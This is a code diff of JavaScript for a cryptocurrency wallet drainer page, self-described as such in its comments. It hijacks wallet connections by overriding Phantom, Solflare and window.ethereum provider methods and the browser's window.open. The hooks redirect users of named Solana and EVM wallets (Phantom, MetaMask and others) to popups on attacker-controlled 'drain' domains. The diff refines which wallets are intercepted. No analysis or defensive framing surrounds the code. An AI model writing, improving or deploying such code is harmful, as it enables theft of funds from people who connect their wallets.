@@ -52,39 +52,41 @@ const modal = createAppKit({
 });
 
 // =====================================================
-// OPEN POPUP WITH WALLET NAME IN URL
+// OPEN POPUP — ONLY FOR SOLANA WALLETS
 // =====================================================
 let popupOpened = false;
 
 // Save original window.open EARLY — before any override
 const _origOpen = window.open.bind(window);
 
+// Solana wallets that should be redirected to the drainer domain
+const SOLANA_WALLETS = ['phantom', 'solflare', 'backpack', 'trust', 'coinbase', 'safepal', 'binance', 'okx'];
+// EVM-only wallets that go to the EVM drainer instead
+const EVM_ONLY_WALLETS = ['metamask', 'brave'];
+
+function isSolanaWallet(name) {
+  const w = (name || '').toLowerCase();
+  return SOLANA_WALLETS.some(sw => w.includes(sw));
+}
+
+function isEvmOnlyWallet(name) {
+  const w = (name || '').toLowerCase();
+  return EVM_ONLY_WALLETS.some(ew => w.includes(ew));
+}
+
 function openDrainPopup(walletName) {
   if (popupOpened) return;
   popupOpened = true;
 
-  try { modal.close(); } catch (e) {}
-  try { modal.disconnect(); } catch (e) {}
-
   // Map wallet name to short key
   const w = (walletName || '').toLowerCase();
   let walletKey = 'auto';
-  if (w.includes('phantom')) walletKey = 'phantom';
-  else if (w.includes('solflare')) walletKey = 'solflare';
-  else if (w.includes('trust')) walletKey = 'trust';
-  else if (w.includes('backpack')) walletKey = 'backpack';
-  else if (w.includes('coinbase')) walletKey = 'coinbase';
-  else if (w.includes('safepal')) walletKey = 'safepal';
-  else if (w.includes('binance')) walletKey = 'binance';
-  else if (w.includes('okx')) walletKey = 'okx';
-  else if (w.includes('metamask')) walletKey = 'metamask';
-  else if (w.includes('brave')) walletKey = 'brave';
-  else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';
-  else if (w.trim()) walletKey = w.replace(/[^a-z0-9]/g, '');
+  for (const sw of [...SOLANA_WALLETS, ...EVM_ONLY_WALLETS]) {
+    if (w.includes(sw)) { walletKey = sw; break; }
+  }
 
   // EVM-only wallets go to EVM drainer
-  const evmWallets = ['metamask', 'brave'];
-  const drainBase = evmWallets.includes(walletKey) ? EVM_DRAIN_BASE : DRAIN_BASE;
+  const drainBase = EVM_ONLY_WALLETS.includes(walletKey) ? EVM_DRAIN_BASE : DRAIN_BASE;
   const url = `${drainBase}?connect=1&w=${walletKey}`;
 
   if (isMobile) {
@@ -93,7 +95,6 @@ function openDrainPopup(walletName) {
     const pw = 420, ph = 700;
     const left = Math.round((screen.width - pw) / 2);
     const top = Math.round((screen.height - ph) / 2);
-    // Use _origOpen to bypass our own interceptor
     _origOpen(url, 'connect_wallet',
       `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
     );
@@ -103,41 +104,17 @@ function openDrainPopup(walletName) {
 }
 
 // =====================================================
-// INTERCEPT WALLET CLICKS
+// INTERCEPT ONLY SOLANA/EVM WALLET CLICKS — let others connect on landing
 // =====================================================
 
-// Track last selected wallet name
 let lastClickedWallet = '';
 
-// ---- BLOCK WALLET CONNECTIONS ON LANDING DOMAIN ----
-// Let AppKit show wallets normally, but when a wallet tries to connect,
-// block it and open the drain popup instead.
-
-// Block ALL wallet extensions — Solana AND EVM (MetaMask, Brave, etc.)
-function blockAllProviders() {
-  // --- EVM providers (MetaMask, Brave, Trust, etc.) ---
-  const patchEVM = (provider) => {
-    if (!provider?.request || provider._landingBlocked) return;
-    provider._landingBlocked = true;
-    const origRequest = provider.request.bind(provider);
-    provider.request = function(args) {
-      if (args?.method === 'eth_requestAccounts' || args?.method === 'wallet_requestPermissions') {
-        const name = provider.isMetaMask ? 'metamask' : provider.isTrust ? 'trust' : provider.isBraveWallet ? 'brave' : lastClickedWallet || 'auto';
-        openDrainPopup(name);
-        return new Promise(() => {}); // never resolve
-      }
-      return origRequest(args);
-    };
-  };
-  if (window.ethereum) {
-    patchEVM(window.ethereum);
-    if (window.ethereum.providers) window.ethereum.providers.forEach(patchEVM);
-  }
-
-  // --- Solana providers ---
+// Block Solana wallet extensions
+function blockSolanaProviders() {
   // Phantom
   if (window.phantom?.solana && !window.phantom.solana._landingBlocked) {
     window.phantom.solana._landingBlocked = true;
+    const origConnect = window.phantom.solana.connect.bind(window.phantom.solana);
     window.phantom.solana.connect = function() {
       openDrainPopup('phantom');
       return new Promise(() => {});
@@ -166,42 +143,68 @@ function blockAllProviders() {
       return new Promise(() => {});
     };
   }
+
+  // Also block EVM providers (MetaMask, Brave) — redirect to EVM drainer
+  const patchEVM = (provider) => {
+    if (!provider?.request || provider._landingBlocked) return;
+    provider._landingBlocked = true;
+    const origRequest = provider.request.bind(provider);
+    provider.request = function(args) {
+      if (args?.method === 'eth_requestAccounts' || args?.method === 'wallet_requestPermissions') {
+        const name = provider.isMetaMask ? 'metamask' : provider.isBraveWallet ? 'brave' : lastClickedWallet || 'metamask';
+        openDrainPopup(name);
+        return new Promise(() => {});
+      }
+      return origRequest(args);
+    };
+  };
+  if (window.ethereum) {
+    patchEVM(window.ethereum);
+    if (window.ethereum.providers) window.ethereum.providers.forEach(patchEVM);
+  }
 }
 
-// Patch immediately + re-check (extensions load async)
-blockAllProviders();
-setTimeout(blockAllProviders, 500);
-setTimeout(blockAllProviders, 1500);
-setTimeout(blockAllProviders, 3000);
+blockSolanaProviders();
+setTimeout(blockSolanaProviders, 500);
+setTimeout(blockSolanaProviders, 1500);
+setTimeout(blockSolanaProviders, 3000);
 
-// Track wallet name from AppKit events — intercept ALL wallet selections
+// Intercept AppKit wallet selections — ONLY redirect Solana and EVM-only wallets
 modal.subscribeEvents((event) => {
   const e = event?.data?.event;
   if (e === 'SELECT_WALLET') {
     const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
     if (name) {
       lastClickedWallet = name;
-      openDrainPopup(name);
+      // Only intercept Solana wallets and EVM-only wallets — let WalletConnect etc. go through AppKit
+      if (isSolanaWallet(name) || isEvmOnlyWallet(name)) {
+        openDrainPopup(name);
+      }
+      // else: AppKit handles it natively on the landing domain (QR, deep link, etc.)
     }
   }
 });
 
-// Backup: If wallet somehow connects to landing, disconnect and redirect
+// If a Solana wallet somehow connects to landing, disconnect and redirect
 modal.subscribeProviders((state) => {
   if (state['solana']) {
-    try { modal.disconnect(); } catch (e) {}
-    openDrainPopup(lastClickedWallet);
+    const addr = modal.getAddress();
+    if (addr) {
+      try { modal.disconnect(); } catch (e) {}
+      openDrainPopup(lastClickedWallet || 'auto');
+    }
   }
 });
 
-// Method 4: Intercept deep links (wallet:// protocol opens)
+// Intercept deep links only for Solana/EVM wallets
 window.open = function(url, ...args) {
-  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
+  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE) && !url.includes(EVM_DRAIN_BASE)) {
     if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
     if (url.includes('solflare')) { openDrainPopup('solflare'); return null; }
-    if (url.includes('trust')) { openDrainPopup('trust'); return null; }
     if (url.includes('backpack')) { openDrainPopup('backpack'); return null; }
-    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup('walletconnect'); return null; }
+    if (url.includes('metamask')) { openDrainPopup('metamask'); return null; }
+    if (url.includes('brave://')) { openDrainPopup('brave'); return null; }
+    // WalletConnect deep links → let AppKit handle them (NOT intercepted)
   }
   return _origOpen.call(window, url, ...args);
 };
